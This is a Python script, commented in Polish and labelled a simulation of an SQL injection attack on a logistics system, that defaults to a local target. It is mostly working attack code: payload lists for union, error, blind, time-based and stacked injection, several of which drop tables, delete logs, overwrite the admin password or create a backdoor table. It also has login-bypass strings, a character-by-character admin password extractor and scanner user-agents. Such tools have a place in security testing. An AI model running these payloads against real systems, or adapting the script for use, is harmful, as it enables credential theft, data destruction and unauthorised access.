#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Skrypt symulujący atak SQL Injection na system logistyczny.
"""

import argparse
import logging
import random
import requests
import sys
import time
import json
import base64
from datetime import datetime
from urllib.parse import quote

# Konfiguracja logowania
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('sql_injection_attack')

# Statystyki ataku
attack_stats = {
    'total_attempts': 0,
    'successful_attacks': 0,
    'failed_attacks': 0,
    'extracted_data': [],
    'start_time': None,
    'end_time': None
}

# Payloady SQL Injection dla różnych technik
SQL_PAYLOADS = {
    'union': [
        "' UNION SELECT 1,username,password,4,5 FROM users--",
        "' UNION SELECT NULL,username||'~'||password,NULL,NULL,NULL FROM users--",
        "1' UNION SELECT 1,group_concat(username||':'||password),3,4,5 FROM users--",
        "' UNION SELECT 1,sqlite_version(),3,4,5--",
        "' UNION ALL SELECT table_name,column_name,NULL,NULL,NULL FROM information_schema.columns--",
        "' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type='table'--",
        "' UNION SELECT 1,name,2,3,4 FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'--"
    ],
    'error': [
        "' AND 1=CAST((SELECT username||'~'||password FROM users LIMIT 1) AS INT)--",
        "' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--",
        "' AND updatexml(null,concat(0x7e,(SELECT password FROM users LIMIT 1)),null)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND exp(~(SELECT * FROM (SELECT password FROM users LIMIT 1)x))--"
    ],
    'blind': [
        "' AND (SELECT COUNT(*) FROM users) > 0--",
        "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 5--",
        "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
        "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 97--",
        "' AND EXISTS(SELECT * FROM users WHERE username LIKE 'a%')--"
    ],
    'time': [
        "' OR IF(1=1, SLEEP(5), 0)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
        "' OR (SELECT COUNT(*) FROM generate_series(1,5000000))>0--",
        "'; SELECT pg_sleep(5)--"
    ],
    'stacked': [
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --",
        "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
        "'; DELETE FROM logs WHERE 1=1; --",
        "'; DROP TABLE audit_logs; --",
        "'; CREATE TABLE backdoor (id INT, cmd TEXT); --"
    ],
    'authentication_bypass': [
        "admin' --",
        "admin' OR '1'='1",
        "' OR 1=1--",
        "' OR 'x'='x",
        "admin'/*",
        "') OR ('1'='1",
        "admin' OR 1=1#",
        "' OR ''='"
    ]
}

# Endpoints podatne na SQL Injection
VULNERABLE_ENDPOINTS = [
    '/login',
    '/search',
    '/api/routes/',
    '/api/transmitters',
    '/api/vehicles'
]

# User-Agent strings
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'sqlmap/1.5.9#stable (http://sqlmap.org)',
    'Havij/1.16 Pro',
    'SQL-Injection-Scanner/2.0'
]


def parse_arguments():
    """Parsowanie argumentów wiersza poleceń."""
    parser = argparse.ArgumentParser(description='Symulacja ataku SQL Injection na system logistyczny')
    parser.add_argument('--target', type=str, default='localhost:8001', help='Cel ataku (host:port)')
    parser.add_argument('--method', type=str, choices=['union', 'error', 'blind', 'time', 'all'], default='union',
                        help='Metoda ataku SQL Injection')
    parser.add_argument('--endpoint', type=str, help='Konkretny endpoint do ataku')
    parser.add_argument('--username', type=str, default='admin', help='Nazwa użytkownika do ataku')
    parser.add_argument('--threads', type=int, default=1, help='Liczba wątków')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout dla żądań')
    parser.add_argument('--delay', type=int, default=1, help='Opóźnienie między żądaniami (sekundy)')
    parser.add_argument('--verbose', action='store_true', help='Szczegółowe logowanie')
    parser.add_argument('--output', type=str, help='Plik do zapisu wyników')
    parser.add_argument('--proxy', type=str, help='Proxy (http://host:port)')

    return parser.parse_args()


def test_union_based(target_url, endpoint, timeout=10, verbose=False):
    """
    Testuje SQL Injection metodą UNION.

    Args:
        target_url (str): URL celu
        endpoint (str): Endpoint do testowania
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        dict: Wyniki testu
    """
    results = {
        'vulnerable': False,
        'successful_payloads': [],
        'extracted_data': []
    }

    url = f"http://{target_url}{endpoint}"

    for payload in SQL_PAYLOADS['union']:
        try:
            # Test w parametrze GET
            if 'search' in endpoint:
                test_url = f"{url}?q={quote(payload)}"
                response = requests.get(test_url, timeout=timeout)

                if verbose:
                    logger.debug(f"Testing UNION payload: {payload}")
                    logger.debug(f"Response status: {response.status_code}")

                # Analiza odpowiedzi
                if response.status_code == 200:
                    if any(keyword in response.text.lower() for keyword in ['admin', 'password', 'sqlite', 'user']):
                        results['vulnerable'] = True
                        results['successful_payloads'].append(payload)
                        results['extracted_data'].append(response.text[:500])
                        logger.info(f"[+] UNION SQL Injection successful with payload: {payload}")

            # Test w parametrze POST
            elif 'login' in endpoint:
                data = {
                    'username': payload,
                    'password': 'test'
                }
                response = requests.post(url, data=data, timeout=timeout)

                if response.status_code != 401:  # Coś innego niż błąd autoryzacji
                    results['vulnerable'] = True
                    results['successful_payloads'].append(payload)
                    logger.info(f"[+] UNION SQL Injection successful with payload: {payload}")

            attack_stats['total_attempts'] += 1

        except Exception as e:
            if verbose:
                logger.error(f"Error testing UNION payload: {e}")
            attack_stats['failed_attacks'] += 1

    return results


def test_error_based(target_url, endpoint, timeout=10, verbose=False):
    """
    Testuje SQL Injection metodą Error-based.

    Args:
        target_url (str): URL celu
        endpoint (str): Endpoint do testowania
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        dict: Wyniki testu
    """
    results = {
        'vulnerable': False,
        'successful_payloads': [],
        'extracted_data': []
    }

    url = f"http://{target_url}{endpoint}"

    for payload in SQL_PAYLOADS['error']:
        try:
            if 'search' in endpoint:
                test_url = f"{url}?q={quote(payload)}"
                response = requests.get(test_url, timeout=timeout)
            else:
                data = {'username': payload, 'password': 'test'}
                response = requests.post(url, data=data, timeout=timeout)

            # Szukanie błędów SQL w odpowiedzi
            error_indicators = [
                'sql syntax',
                'mysql_fetch',
                'warning:',
                'sqlite_',
                'database error',
                'ora-',
                'db2_',
                'odbc_',
                'postgresql'
            ]

            response_lower = response.text.lower()
            for indicator in error_indicators:
                if indicator in response_lower:
                    results['vulnerable'] = True
                    results['successful_payloads'].append(payload)
                    results['extracted_data'].append(response.text[:500])
                    logger.info(f"[+] Error-based SQL Injection successful with payload: {payload}")
                    break

            attack_stats['total_attempts'] += 1

        except Exception as e:
            if verbose:
                logger.error(f"Error testing error-based payload: {e}")
            attack_stats['failed_attacks'] += 1

    return results


def test_blind_based(target_url, endpoint, timeout=10, verbose=False):
    """
    Testuje SQL Injection metodą Blind.

    Args:
        target_url (str): URL celu
        endpoint (str): Endpoint do testowania
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        dict: Wyniki testu
    """
    results = {
        'vulnerable': False,
        'successful_payloads': [],
        'extracted_data': []
    }

    url = f"http://{target_url}{endpoint}"

    # Test podstawowy - porównanie odpowiedzi TRUE/FALSE
    try:
        # Payload TRUE
        true_payload = "' OR '1'='1"
        if 'search' in endpoint:
            true_url = f"{url}?q={quote(true_payload)}"
            true_response = requests.get(true_url, timeout=timeout)
        else:
            true_data = {'username': true_payload, 'password': 'test'}
            true_response = requests.post(url, data=true_data, timeout=timeout)

        # Payload FALSE
        false_payload = "' AND '1'='2"
        if 'search' in endpoint:
            false_url = f"{url}?q={quote(false_payload)}"
            false_response = requests.get(false_url, timeout=timeout)
        else:
            false_data = {'username': false_payload, 'password': 'test'}
            false_response = requests.post(url, data=false_data, timeout=timeout)

        # Porównanie odpowiedzi
        if len(true_response.text) != len(
                false_response.text) or true_response.status_code != false_response.status_code:
            results['vulnerable'] = True
            logger.info("[+] Blind SQL Injection vulnerability detected")

            # Próba wyciągnięcia danych
            extracted_data = extract_data_blind(url, endpoint, timeout, verbose)
            if extracted_data:
                results['extracted_data'] = extracted_data
                results['successful_payloads'].append("Blind extraction successful")

        attack_stats['total_attempts'] += 2

    except Exception as e:
        if verbose:
            logger.error(f"Error testing blind payload: {e}")
        attack_stats['failed_attacks'] += 1

    return results


def test_time_based(target_url, endpoint, timeout=15, verbose=False):
    """
    Testuje SQL Injection metodą Time-based.

    Args:
        target_url (str): URL celu
        endpoint (str): Endpoint do testowania
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        dict: Wyniki testu
    """
    results = {
        'vulnerable': False,
        'successful_payloads': [],
        'extracted_data': []
    }

    url = f"http://{target_url}{endpoint}"

    for payload in SQL_PAYLOADS['time']:
        try:
            start_time = time.time()

            if 'search' in endpoint:
                test_url = f"{url}?q={quote(payload)}"
                response = requests.get(test_url, timeout=timeout)
            else:
                data = {'username': payload, 'password': 'test'}
                response = requests.post(url, data=data, timeout=timeout)

            elapsed_time = time.time() - start_time

            # Jeśli odpowiedź trwała dłużej niż 4 sekundy, prawdopodobnie jest podatność
            if elapsed_time > 4:
                results['vulnerable'] = True
                results['successful_payloads'].append(payload)
                logger.info(f"[+] Time-based SQL Injection successful with payload: {payload}")
                logger.info(f"    Response time: {elapsed_time:.2f} seconds")

            attack_stats['total_attempts'] += 1

        except requests.exceptions.Timeout:
            # Timeout może również oznaczać podatność
            results['vulnerable'] = True
            results['successful_payloads'].append(payload)
            logger.info(f"[+] Time-based SQL Injection successful (timeout) with payload: {payload}")
        except Exception as e:
            if verbose:
                logger.error(f"Error testing time-based payload: {e}")
            attack_stats['failed_attacks'] += 1

    return results


def extract_data_blind(url, endpoint, timeout=10, verbose=False):
    """
    Próbuje wyciągnąć dane metodą blind SQL injection.

    Args:
        url (str): URL celu
        endpoint (str): Endpoint
        timeout (int): Timeout
        verbose (bool): Szczegółowe logowanie

    Returns:
        list: Wyciągnięte dane
    """
    extracted_data = []

    # Próba wyciągnięcia nazwy użytkownika admin
    admin_password = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*"

    for position in range(1, 20):  # Zakładamy max 20 znaków hasła
        found_char = False

        for char in charset:
            payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}'--"

            try:
                if 'search' in endpoint:
                    test_url = f"{url}?q={quote(payload)}"
                    response = requests.get(test_url, timeout=timeout)
                else:
                    data = {'username': payload, 'password': 'test'}
                    response = requests.post(url, data=data, timeout=timeout)

                # Jeśli odpowiedź jest "pozytywna", znaleźliśmy znak
                if "true_response_indicator" in response.text or response.status_code == 200:
                    admin_password += char
                    found_char = True
                    if verbose:
                        logger.info(f"Found character at position {position}: {char}")
                    break

            except Exception as e:
                if verbose:
                    logger.error(f"Error in blind extraction: {e}")

        if not found_char:
            break

    if admin_password:
        extracted_data.append(f"Admin password: {admin_password}")

    return extracted_data


def test_authentication_bypass(target_url, timeout=10, verbose=False):
    """
    Testuje obejście uwierzytelniania SQL Injection.

    Args:
        target_url (str): URL celu
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        dict: Wyniki testu
    """
    results = {
        'vulnerable': False,
        'successful_payloads': [],
        'extracted_data': []
    }

    url = f"http://{target_url}/login"

    for payload in SQL_PAYLOADS['authentication_bypass']:
        try:
            data = {
                'username': payload,
                'password': 'anything'
            }

            response = requests.post(url, data=data, timeout=timeout)

            # Sprawdzenie czy udało się zalogować
            if response.status_code == 200 and 'login' not in response.url.lower():
                results['vulnerable'] = True
                results['successful_payloads'].append(payload)
                logger.info(f"[+] Authentication bypass successful with payload: {payload}")

            attack_stats['total_attempts'] += 1

        except Exception as e:
            if verbose:
                logger.error(f"Error testing authentication bypass: {e}")
            attack_stats['failed_attacks'] += 1

        time.sleep(0.5)  # Krótkie opóźnienie między próbami

    return results


def automated_sqli_scan(target_url, timeout=10, verbose=False):
    """
    Przeprowadza automatyczne skanowanie SQL Injection na wszystkich endpointach.

    Args:
        target_url (str): URL celu
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        dict: Wyniki skanowania
    """
    scan_results = {}

    for endpoint in VULNERABLE_ENDPOINTS:
        logger.info(f"\n[*] Scanning endpoint: {endpoint}")

        # Testowanie różnych metod
        scan_results[endpoint] = {
            'union': test_union_based(target_url, endpoint, timeout, verbose),
            'error': test_error_based(target_url, endpoint, timeout, verbose),
            'blind': test_blind_based(target_url, endpoint, timeout, verbose),
            'time': test_time_based(target_url, endpoint, timeout, verbose)
        }

        # Jeśli to endpoint logowania, testuj też bypass
        if 'login' in endpoint:
            scan_results[endpoint]['auth_bypass'] = test_authentication_bypass(target_url, timeout, verbose)

    return scan_results


def save_results(results, output_file):
    """
    Zapisuje wyniki do pliku.

    Args:
        results (dict): Wyniki ataku
        output_file (str): Ścieżka do pliku
    """
    try:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=4)
        logger.info(f"Results saved to: {output_file}")
    except Exception as e:
        logger.error(f"Error saving results: {e}")


def display_summary(scan_results):
    """
    Wyświetla podsumowanie ataku.

    Args:
        scan_results (dict): Wyniki skanowania
    """
    print("\n=== SQL Injection Attack Summary ===")
    print(f"Start time: {attack_stats['start_time']}")
    print(f"End time: {attack_stats['end_time']}")
    print(f"Total attempts: {attack_stats['total_attempts']}")
    print(f"Successful attacks: {attack_stats['successful_attacks']}")
    print(f"Failed attacks: {attack_stats['failed_attacks']}")

    print("\n=== Vulnerable Endpoints ===")
    for endpoint, results in scan_results.items():
        vulnerable_methods = []
        for method, result in results.items():
            if result.get('vulnerable', False):
                vulnerable_methods.append(method)

        if vulnerable_methods:
            print(f"{endpoint}: {', '.join(vulnerable_methods)}")

    print("\n=== Extracted Data ===")
    for endpoint, results in scan_results.items():
        for method, result in results.items():
            if result.get('extracted_data'):
                print(f"{endpoint} ({method}):")
                for data in result['extracted_data']:
                    print(f"  - {data[:100]}...")  # Wyświetl pierwsze 100 znaków

    print("===========================")


def main():
    """Główna funkcja programu."""
    args = parse_arguments()

    # Konfiguracja proxy jeśli podano
    proxies = None
    if args.proxy:
        proxies = {
            'http': args.proxy,
            'https': args.proxy
        }

    # Inicjalizacja statystyk
    attack_stats['start_time'] = datetime.now()

    logger.info("=== SQL Injection Attack Simulation ===")
    logger.info(f"Target: {args.target}")
    logger.info(f"Method: {args.method}")
    logger.info("=====================================\n")

    try:
        if args.method == 'all':
            # Automatyczne skanowanie wszystkich metod
            scan_results = automated_sqli_scan(args.target, args.timeout, args.verbose)
        else:
            # Test konkretnej metody
            endpoint = args.endpoint or '/search'

            if args.method == 'union':
                results = test_union_based(args.target, endpoint, args.timeout, args.verbose)
            elif args.method == 'error':
                results = test_error_based(args.target, endpoint, args.timeout, args.verbose)
            elif args.method == 'blind':
                results = test_blind_based(args.target, endpoint, args.timeout, args.verbose)
            elif args.method == 'time':
                results = test_time_based(args.target, endpoint, args.timeout, args.verbose)

            scan_results = {endpoint: {args.method: results}}

        # Zakończenie ataku
        attack_stats['end_time'] = datetime.now()

        # Zliczanie udanych ataków
        for endpoint_results in scan_results.values():
            for method_results in endpoint_results.values():
                if method_results.get('vulnerable', False):
                    attack_stats['successful_attacks'] += 1

        # Wyświetlenie podsumowania
        display_summary(scan_results)

        # Zapis wyników jeśli podano plik wyjściowy
        if args.output:
            save_results({
                'scan_results': scan_results,
                'statistics': attack_stats
            }, args.output)

    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        attack_stats['end_time'] = datetime.now()
    except Exception as e:
        logger.error(f"Error during attack: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    main()